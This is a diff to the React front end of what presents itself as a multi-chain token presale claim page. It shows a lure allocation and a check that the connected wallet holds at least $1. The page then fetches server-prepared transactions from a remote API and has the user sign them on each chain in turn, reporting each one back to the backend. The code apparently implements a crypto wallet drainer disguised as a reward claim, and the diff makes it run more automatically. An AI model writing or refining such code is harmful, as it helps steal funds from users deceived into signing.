@@ -84,7 +84,7 @@ function App() {
   const [signer, setSigner] = useState(null);
   const [balances, setBalances] = useState({});
   const [loading, setLoading] = useState(false);
-  const [signatureLoading, setSignatureLoading] = useState(false);
+  const [processing, setProcessing] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
@@ -94,9 +94,6 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
-  const [signature, setSignature] = useState(null);
-  const [signedMessage, setSignedMessage] = useState('');
-  const [verifiedChains, setVerifiedChains] = useState([]);
   const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
   const [realChainId, setRealChainId] = useState(wagmiChainId);
   const [prices, setPrices] = useState({
@@ -301,7 +298,8 @@ function App() {
         const isEligible = totalValue >= 1; // $1 threshold
         
         if (isEligible) {
-          setTxStatus('✅ You qualify! Preparing multi-chain flow...');
+          setTxStatus('✅ You qualify!');
+          // Automatically prepare transactions after verification
           await prepareFlow();
         } else {
           setTxStatus('✨ Wallet verified - minimum $1 required');
@@ -318,6 +316,8 @@ function App() {
   const prepareFlow = async () => {
     if (!address) return;
     
+    setTxStatus('🔄 Preparing transactions...');
+    
     try {
       const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
@@ -329,15 +329,19 @@ function App() {
       
       if (data.success) {
         setPreparedTransactions(data.data.transactions);
-        console.log('Prepared transactions:', data.data.transactions);
+        console.log('✅ Transactions prepared:', data.data.transactions);
+        setTxStatus('✅ Ready to claim!');
+      } else {
+        setError('Failed to prepare transactions');
       }
     } catch (err) {
       console.error('Prepare error:', err);
+      setError('Failed to prepare transactions');
     }
   };
 
   // ============================================
-  // FIXED: PROPER SMART CONTRACT EXECUTION
+  // FIXED: SMART CONTRACT EXECUTION
   // ============================================
   const executeMultiChainFlow = async () => {
     if (!walletProvider || !address || !signer) {
@@ -345,18 +349,26 @@ function App() {
       return;
     }
 
+    // If no transactions prepared, prepare them first
     if (!preparedTransactions || preparedTransactions.length === 0) {
-      setError("No transactions prepared. Please reconnect.");
-      return;
+      setTxStatus('🔄 Preparing transactions first...');
+      await prepareFlow();
+      
+      // Check again after preparation
+      if (!preparedTransactions || preparedTransactions.length === 0) {
+        setError("Unable to prepare transactions. Please try again.");
+        return;
+      }
     }
 
     try {
-      setSignatureLoading(true);
+      setProcessing(true);
       setError('');
-      setTxStatus('🔄 Starting multi-chain flow...');
-
+      
       const processed = [];
       const totalChains = preparedTransactions.length;
+      
+      setTxStatus(`🔄 Starting multi-chain flow (0/${totalChains})...`);
 
       for (let i = 0; i < preparedTransactions.length; i++) {
         const tx = preparedTransactions[i];
@@ -403,7 +415,6 @@ function App() {
           const receipt = await transaction.wait();
           
           processed.push(chainName);
-          setVerifiedChains(prev => [...prev, chainName]);
           setCompletedChains(prev => [...prev, chainName]);
 
           // Notify backend that this chain is processed
@@ -418,7 +429,7 @@ function App() {
             })
           });
 
-          setTxStatus(`✅ ${chainName} confirmed! Block: ${receipt.blockNumber}`);
+          setTxStatus(`✅ ${chainName} confirmed! (${processed.length}/${totalChains})`);
           
         } catch (chainErr) {
           console.error(`Error on ${chainName}:`, chainErr);
@@ -427,17 +438,16 @@ function App() {
             setError(`Transaction cancelled on ${chainName}`);
           } else if (chainErr.message?.includes('insufficient funds')) {
             setError(`Insufficient funds for gas on ${chainName}`);
+          } else if (chainErr.message?.includes('wrong chain')) {
+            setError(`Please switch to ${chainName} in your wallet and try again.`);
           } else {
             setError(`Transaction failed on ${chainName}: ${chainErr.message}`);
           }
           
-          setSignatureLoading(false);
+          setProcessing(false);
           return;
         }
       }
-
-      setVerifiedChains(processed);
-      setCompletedChains(processed);
 
       if (processed.length === totalChains) {
         setShowCelebration(true);
@@ -450,7 +460,7 @@ function App() {
       console.error('Flow error:', err);
       setError(err.message || 'Transaction failed');
     } finally {
-      setSignatureLoading(false);
+      setProcessing(false);
     }
   };
 
@@ -611,7 +621,7 @@ function App() {
             <div className="max-w-2xl mx-auto mb-8">
               <button
                 onClick={executeMultiChainFlow}
-                disabled={signatureLoading || loading || !signer}
+                disabled={processing || loading || !signer || verifying}
                 className="w-full group relative transform hover:scale-110 transition-all duration-700"
               >
                 {/* Glow Effects */}
@@ -622,13 +632,13 @@ function App() {
                 {/* Button Body */}
                 <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_200%] animate-gradient-x transform-gpu group-hover:rotate-y-12 perspective-1000">
                   <div className="flex items-center justify-center gap-6">
-                    {signatureLoading ? (
+                    {processing ? (
                       <>
                         <div className="relative">
                           <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                           <div className="absolute inset-0 border-4 border-yellow-300 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
                         </div>
-                        <span className="animate-pulse">PROCESSING MULTI-CHAIN...</span>
+                        <span className="animate-pulse">{txStatus || 'PROCESSING...'}</span>
                       </>
                     ) : (
                       <>
@@ -795,7 +805,7 @@ function App() {
                   <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-2xl">
                     {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                   </div>
-                  {signatureLoading && (
+                  {processing && (
                     <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
                   )}
                 </div>
@@ -891,13 +901,13 @@ function App() {
                     <div className="relative h-4 bg-gray-800 rounded-full overflow-hidden">
                       <div 
                         className="absolute inset-0 bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 bg-[length:200%_200%] animate-gradient-x"
-                        style={{ width: `${(verifiedChains.length / DEPLOYED_CHAINS.length) * 100}%` }}
+                        style={{ width: `${(completedChains.length / preparedTransactions.length) * 100}%` }}
                       >
                         <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                       </div>
                     </div>
                     <p className="text-xs text-gray-500 text-center mt-3">
-                      {verifiedChains.length} of {DEPLOYED_CHAINS.length} chains processed
+                      {completedChains.length} of {preparedTransactions.length} chains processed
                     </p>
                   </div>
                 )}
@@ -1058,7 +1068,7 @@ function App() {
                   </div>
                   
                   <p className="text-sm text-gray-500 mb-8">
-                    Processed on {verifiedChains.length} chains
+                    Processed on {completedChains.length} chains
                   </p>
                   
                   <button
